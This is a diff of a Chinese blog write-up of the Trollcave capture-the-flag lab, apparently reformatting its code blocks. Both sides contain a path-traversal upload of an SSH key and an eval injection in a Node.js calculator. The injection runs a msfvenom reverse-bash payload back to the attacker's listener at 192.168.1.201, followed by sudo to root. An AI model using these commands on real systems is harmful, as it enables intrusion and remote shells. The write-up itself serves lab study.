@@ -431,21 +431,167 @@
 <blockquote>
 <p>如果想让我在这个网站上做更多的工作的话，那你就真的得给我一些权限了，我知道这不是一个好的点子，我可以交互式的使用rails这个用户，也许我们可以把它区分开来（区分开来可以理解为用户权限低，干涉不了系统）</p>
 </blockquote>
-<p>这个时候我们回到上方选项，发现多了一个功能，<code>Admin panel</code>，管理控制面板<br><img src="http://t1.aixinxi.net/o_1ci3jq5vvofg1p5tur01ugu1naja.png-j.jpg" alt=""><br>才发现原来不是什么过滤防护，而是上传文件的功能关闭了，可以看到还有注册功能也给关闭了<code>Enable registration</code>，这里把文件上传先打开（注册功能随你喜好开），接着回到文件上传处，发现文件可以上传了，但是要提醒的一点是，这个网站的编程语言是用ruby写的，所以php、asp之类的木马是回弹不了shell的，它根本就不解析<br><img src="http://t1.aixinxi.net/o_1ci3krrej1r7cgatf9hhrtj68a.png-j.jpg" alt=""><br>这个时候看到上传处下方有一个<code>Alternate file name</code>，后来在seebug上面查到了<code>CVE-2012-4522</code>，Ruby本地文件创建漏洞，类别为越权访问，所以这个<code>Alternate file name</code>应该是存在目录遍历的，利用这一点，我们可以直接将我们攻击机的公钥存放到对方机器，做一个免密码ssh登录<br>先生成一个ssh公钥<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@Elapse:/#</span> ssh-keygen -b 2048 -t rsa</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Created directory '/root/.ssh'.</span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:WqCpUsYCx9UzOxK+yehAG8693UoTmQwZ4htZMlW3IKM root<span class="meta">@Elapse</span></span><br><span class="line">The key's randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|<span class="string"> +.*o+ .         </span>|</span><br><span class="line">|<span class="string">..B.* * .        </span>|</span><br><span class="line">|<span class="string">.Eo+ ..=         </span>|</span><br><span class="line">|<span class="string">.=o =o=.         </span>|</span><br><span class="line">|<span class="string">=.BooO .S        </span>|</span><br><span class="line">|<span class="string">.B.o+ .o         </span>|</span><br><span class="line">|<span class="string">.o. ooo          </span>|</span><br><span class="line">|<span class="string"> .......         </span>|</span><br><span class="line">|<span class="string">     ..          </span>|</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure></p>
-<p>接着将/roor/.ssh/id_rsa.pub文件复制一份，改名为authorized_keys，上传上去<br><img src="http://t1.aixinxi.net/o_1ci3l63uv1bas1tlg9bq1ogn1a0ma.png-j.jpg" alt=""><br>因为我们前面在<code>sudo give me sudo</code>这篇文章得知了用户名是rails，所以这里上传的路径是在rails用户目录下的,上传成功后，开始ssh登录<br><img src="http://t1.aixinxi.net/o_1ci3lebn2156g1rrhtab1se41i69a.png-j.jpg" alt=""><br>登录成功，现在我是rails了，但是我们现在权限不够，不能cd /root/，看不到flag，所以我们得进一步的提权</p>
+<p>这个时候我们回到上方选项，发现多了一个功能，<code>Admin panel</code>，管理控制面板<br><img src="http://t1.aixinxi.net/o_1ci3jq5vvofg1p5tur01ugu1naja.png-j.jpg" alt=""><br>才发现原来不是什么过滤防护，而是上传文件的功能关闭了，可以看到还有注册功能也给关闭了<code>Enable registration</code>，这里把文件上传先打开（注册功能随你喜好开），接着回到文件上传处，发现文件可以上传了，但是要提醒的一点是，这个网站的编程语言是用ruby写的，所以php、asp之类的木马是回弹不了shell的，它根本就不解析<br><img src="http://t1.aixinxi.net/o_1ci3krrej1r7cgatf9hhrtj68a.png-j.jpg" alt=""><br>这个时候看到上传处下方有一个<code>Alternate file name</code>，后来在seebug上面查到了<code>CVE-2012-4522</code>，Ruby本地文件创建漏洞，类别为越权访问，所以这个<code>Alternate file name</code>应该是存在目录遍历的，利用这一点，我们可以直接将我们攻击机的公钥存放到对方机器，做一个免密码ssh登录<br>先生成一个ssh公钥</p>
+<pre><code>root@Elapse:/# ssh-keygen -b 2048 -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Created directory &#39;/root/.ssh&#39;.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:WqCpUsYCx9UzOxK+yehAG8693UoTmQwZ4htZMlW3IKM root@Elapse
+The key&#39;s randomart image is:
++---[RSA 2048]----+
+| +.*o+ .         |
+|..B.* * .        |
+|.Eo+ ..=         |
+|.=o =o=.         |
+|=.BooO .S        |
+|.B.o+ .o         |
+|.o. ooo          |
+| .......         |
+|     ..          |
++----[SHA256]-----+
+</code></pre><p>接着将/roor/.ssh/id_rsa.pub文件复制一份，改名为authorized_keys，上传上去<br><img src="http://t1.aixinxi.net/o_1ci3l63uv1bas1tlg9bq1ogn1a0ma.png-j.jpg" alt=""><br>因为我们前面在<code>sudo give me sudo</code>这篇文章得知了用户名是rails，所以这里上传的路径是在rails用户目录下的,上传成功后，开始ssh登录<br><img src="http://t1.aixinxi.net/o_1ci3lebn2156g1rrhtab1se41i69a.png-j.jpg" alt=""><br>登录成功，现在我是rails了，但是我们现在权限不够，不能cd /root/，看不到flag，所以我们得进一步的提权</p>
 <blockquote>
 <p>参考链接 <a href="https://blog.csdn.net/will5451/article/details/53206776" target="_blank" rel="noopener">https://blog.csdn.net/will5451/article/details/53206776</a></p>
 </blockquote>
-<p>在翻找敏感文件的时候，碰巧在king用户目录下找到了一个js文件，内容如下<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">var</span> sys = <span class="built_in">require</span>(<span class="string">'sys'</span>);</span><br><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">'child_process'</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start server</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params">route</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">onRequest</span>(<span class="params">request, response</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> theurl = <span class="built_in">url</span>.parse(request.url);</span><br><span class="line">		<span class="keyword">var</span> pathname = theurl.pathname;</span><br><span class="line">		<span class="keyword">var</span> query = theurl.query; </span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"Request for "</span> + pathname + query + <span class="string">" received."</span>);</span><br><span class="line">		route(pathname, request, query, response);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(onRequest).listen(<span class="number">8888</span>, <span class="string">'127.0.0.1'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Server started"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Route request</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">route</span>(<span class="params">pathname, request, query, response</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"About to route request for "</span> + pathname);</span><br><span class="line">	<span class="keyword">switch</span> (pathname)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// security risk</span></span><br><span class="line">		<span class="comment">/*case "/ping":</span></span><br><span class="line"><span class="comment">			pingit(pathname, request, query, response);</span></span><br><span class="line"><span class="comment">			break;	*/</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">			home(pathname, request, query, response);</span><br><span class="line">			<span class="keyword">break</span>;	</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">"/calc"</span>:</span><br><span class="line">			calc(pathname, request, query, response);</span><br><span class="line">			<span class="keyword">break</span>;	</span><br><span class="line"></span><br><span class="line">		<span class="attribute">default</span>:</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"404"</span>);</span><br><span class="line">			display_404(pathname, request, response);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">pathname, request, query, response</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	response.end(<span class="string">"&lt;h1&gt;The King's Calculator&lt;/h1&gt;"</span> +</span><br><span class="line">			<span class="string">"&lt;p&gt;Enter your calculation below:&lt;/p&gt;"</span> +</span><br><span class="line">			<span class="string">"&lt;form action='/calc' method='get'&gt;"</span> +</span><br><span class="line">				<span class="string">"&lt;input type='text' name='sum' value='1+1'&gt;"</span> +</span><br><span class="line">				<span class="string">"&lt;input type='submit' value='Calculate!'&gt;"</span> +</span><br><span class="line">			<span class="string">"&lt;/form&gt;"</span> +</span><br><span class="line">			<span class="string">"&lt;hr style='margin-top:50%'&gt;"</span> +</span><br><span class="line">			<span class="string">"&lt;small&gt;&lt;i&gt;Powered by node.js&lt;/i&gt;&lt;/small&gt;"</span></span><br><span class="line">			);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params">pathname, request, query, response</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	sum = query.split(<span class="string">'='</span>)[<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">console</span>.log(sum)</span><br><span class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line"></span><br><span class="line">	response.end(<span class="built_in">eval</span>(sum).toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params">pathname, request, query, response</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ip = query.split(<span class="string">'='</span>)[<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">console</span>.log(ip)</span><br><span class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line"></span><br><span class="line">	exec(<span class="string">"ping -c4 "</span> + ip, <span class="function"><span class="keyword">function</span>(<span class="params">err, stdout, stderr</span>) </span>&#123;</span><br><span class="line">		response.end(stdout);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display_404</span>(<span class="params">pathname, request, response</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	response.write(<span class="string">"&lt;h1&gt;404 Not Found&lt;/h1&gt;"</span>);</span><br><span class="line">	response.end(<span class="string">"I don't have that page, sorry!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the server and route the requests</span></span><br><span class="line">start(route);</span><br></pre></td></tr></table></figure></p>
-<p>代码第18行的解释：</p>
+<p>在翻找敏感文件的时候，碰巧在king用户目录下找到了一个js文件，内容如下</p>
+<pre><code>var http = require(&quot;http&quot;);
+var url = require(&quot;url&quot;);
+var sys = require(&#39;sys&#39;);
+var exec = require(&#39;child_process&#39;).exec;
+
+// Start server
+function start(route)
+{
+    function onRequest(request, response)
+    {
+        var theurl = url.parse(request.url);
+        var pathname = theurl.pathname;
+        var query = theurl.query; 
+        console.log(&quot;Request for &quot; + pathname + query + &quot; received.&quot;);
+        route(pathname, request, query, response);
+    }
+
+http.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;);
+console.log(&quot;Server started&quot;);
+}
+
+// Route request
+function route(pathname, request, query, response)
+{
+    console.log(&quot;About to route request for &quot; + pathname);
+    switch (pathname)
+    {
+        // security risk
+        /*case &quot;/ping&quot;:
+            pingit(pathname, request, query, response);
+            break;    */
+
+        case &quot;/&quot;:
+            home(pathname, request, query, response);
+            break;    
+
+        case &quot;/calc&quot;:
+            calc(pathname, request, query, response);
+            break;    
+
+        default:
+            console.log(&quot;404&quot;);
+            display_404(pathname, request, response);
+            break;
+    }
+}
+
+function home(pathname, request, query, response)
+{
+    response.end(&quot;&lt;h1&gt;The King&#39;s Calculator&lt;/h1&gt;&quot; +
+            &quot;&lt;p&gt;Enter your calculation below:&lt;/p&gt;&quot; +
+            &quot;&lt;form action=&#39;/calc&#39; method=&#39;get&#39;&gt;&quot; +
+                &quot;&lt;input type=&#39;text&#39; name=&#39;sum&#39; value=&#39;1+1&#39;&gt;&quot; +
+                &quot;&lt;input type=&#39;submit&#39; value=&#39;Calculate!&#39;&gt;&quot; +
+            &quot;&lt;/form&gt;&quot; +
+            &quot;&lt;hr style=&#39;margin-top:50%&#39;&gt;&quot; +
+            &quot;&lt;small&gt;&lt;i&gt;Powered by node.js&lt;/i&gt;&lt;/small&gt;&quot;
+            );
+}
+
+function calc(pathname, request, query, response)
+{
+    sum = query.split(&#39;=&#39;)[1];
+    console.log(sum)
+    response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});
+
+    response.end(eval(sum).toString());
+}
+
+function ping(pathname, request, query, response)
+{
+    ip = query.split(&#39;=&#39;)[1];
+    console.log(ip)
+    response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});
+
+    exec(&quot;ping -c4 &quot; + ip, function(err, stdout, stderr) {
+        response.end(stdout);
+    });
+}
+
+function display_404(pathname, request, response)
+{
+    response.write(&quot;&lt;h1&gt;404 Not Found&lt;/h1&gt;&quot;);
+    response.end(&quot;I don&#39;t have that page, sorry!&quot;);
+}
+
+// Start the server and route the requests
+start(route);
+</code></pre><p>代码第18行的解释：</p>
 <p>第一行<code>ver http = require(&quot;http&quot;)</code>，表示加载http模块，然后，第18行调用了<code>http</code>模块的<code>createServer</code>的方法，创建了一个服务器实例，第9行的<code>request</code>和是一个对象，表示客户端的http请求，<code>response</code>也是一个对象，表示服务器端的http回应。最后的<code>listen</code>表示启动服务器实例，监听本机的8888端口。</p>
-<p>接着看到48-68行，可以看到一个参数<code>name=&#39;sum&#39; value=&#39;1+1&#39;</code>,然后67行有一个<code>eval(sum)</code>，没有过滤任何字符，所以这一块只可以进行注入的，先来测试一下正常的结果<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:/home/king/calc</span><span class="variable">$ </span>curl <span class="string">"localhost:8888/calc?sum=2+1"</span></span><br><span class="line"><span class="number">3</span>rails<span class="variable">@trollcave</span><span class="symbol">:/home/king/calc</span>$</span><br></pre></td></tr></table></figure></p>
-<p>第二行第一个可以看到输出了结果3，说明是可行的，接下来先生成一个.sh的木马文件<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Elapse:~# msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=192.168.1.201 <span class="attribute">LPORT</span>=4123 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br><span class="line">cd [-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Unix <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: cmd <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 67 bytes</span><br></pre></td></tr></table></figure></p>
-<p>生成完毕后，cat一下查看内容，因为直接传上去太麻烦了，所以我直接在对方电脑，利用vi编辑器将内容复制过去，保存，然后给这个文件777权限，让他能执行<br>做完这些后，打开msfconsole，设置一个监听<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">msf</span> &gt; use exploit/<span class="keyword">multi/handler </span></span><br><span class="line"><span class="symbol">msf</span> exploit(<span class="keyword">multi/handler) </span>&gt; set payload cmd/unix/<span class="keyword">reverse_bash</span></span><br><span class="line"><span class="keyword">payload </span>=&gt; cmd/unix/<span class="keyword">reverse_bash</span></span><br><span class="line"><span class="keyword">msf </span>exploit(<span class="keyword">multi/handler) </span>&gt; set lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">201</span></span><br><span class="line"><span class="symbol">lhost</span> =&gt; <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">201</span></span><br><span class="line"><span class="symbol">msf</span> exploit(<span class="keyword">multi/handler) </span>&gt; set lport <span class="number">4123</span></span><br><span class="line"><span class="symbol">lport</span> =&gt; <span class="number">4123</span></span><br><span class="line"><span class="symbol">msf</span> exploit(<span class="keyword">multi/handler) </span>&gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse </span>TCP handler on <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">201</span>:<span class="number">4123</span></span><br></pre></td></tr></table></figure></p>
-<p>接着开始构造语句<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rails<span class="variable">@trollcave</span><span class="symbol">:/home/king/calc</span><span class="variable">$ </span>curl <span class="string">"localhost:8888/calc?sum=require('child_process').exec('/tmp/shell.sh')"</span></span><br></pre></td></tr></table></figure></p>
-<p>回车，得到shell<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span>:<span class="number">4123</span> </span><br><span class="line">[*] Command shell session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span>:<span class="number">4123</span> -&gt; <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.109</span>:<span class="number">56258</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">07</span>-<span class="number">10</span> <span class="number">23</span>:<span class="number">09</span>:<span class="number">28</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(king) gid=<span class="number">1000</span>(king) groups=<span class="number">1000</span>(king),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">110</span>(lxd),<span class="number">117</span>(lpadmin),<span class="number">118</span>(sambashare)</span><br></pre></td></tr></table></figure></p>
-<p>ls -al可以发现目录存在一个<code>.sudo_as_admin_successful</code>，所以直接切换到root用户<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">king<span class="variable">@trollcave</span><span class="symbol">:/</span><span class="variable">$ </span>sudo su</span><br><span class="line">sudo su</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:/</span><span class="comment"># cd /root/</span></span><br><span class="line">cd /root/</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">et tu, dragon?</span><br><span class="line"></span><br><span class="line">c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</span><br><span class="line">root<span class="variable">@trollcave</span><span class="symbol">:~</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<p>完成，到这里就都弄完了</p>
+<p>接着看到48-68行，可以看到一个参数<code>name=&#39;sum&#39; value=&#39;1+1&#39;</code>,然后67行有一个<code>eval(sum)</code>，没有过滤任何字符，所以这一块只可以进行注入的，先来测试一下正常的结果</p>
+<pre><code>rails@trollcave:/home/king/calc$ curl &quot;localhost:8888/calc?sum=2+1&quot;
+3rails@trollcave:/home/king/calc$
+</code></pre><p>第二行第一个可以看到输出了结果3，说明是可行的，接下来先生成一个.sh的木马文件</p>
+<pre><code>root@Elapse:~# msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.201 LPORT=4123 -f raw &gt; shell.sh
+cd [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 67 bytes
+</code></pre><p>生成完毕后，cat一下查看内容，因为直接传上去太麻烦了，所以我直接在对方电脑，利用vi编辑器将内容复制过去，保存，然后给这个文件777权限，让他能执行<br>做完这些后，打开msfconsole，设置一个监听</p>
+<pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(multi/handler) &gt; set payload cmd/unix/reverse_bash
+payload =&gt; cmd/unix/reverse_bash
+msf exploit(multi/handler) &gt; set lhost 192.168.1.201
+lhost =&gt; 192.168.1.201
+msf exploit(multi/handler) &gt; set lport 4123
+lport =&gt; 4123
+msf exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on 192.168.1.201:4123
+</code></pre><p>接着开始构造语句</p>
+<pre><code>rails@trollcave:/home/king/calc$ curl &quot;localhost:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/shell.sh&#39;)&quot;
+</code></pre><p>回车，得到shell</p>
+<pre><code>[*] Started reverse TCP handler on 192.168.1.201:4123 
+[*] Command shell session 1 opened (192.168.1.201:4123 -&gt; 192.168.1.109:56258) at 2018-07-10 23:09:28 +0800
+
+id
+uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
+</code></pre><p>ls -al可以发现目录存在一个<code>.sudo_as_admin_successful</code>，所以直接切换到root用户</p>
+<pre><code>king@trollcave:/$ sudo su
+sudo su
+root@trollcave:/# cd /root/
+cd /root/
+root@trollcave:~# ls
+ls
+flag.txt
+root@trollcave:~# cat flag.txt
+cat flag.txt
+et tu, dragon?
+
+c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
+root@trollcave:~#
+</code></pre><p>完成，到这里就都弄完了</p>
 
             </div>
             <hr/>
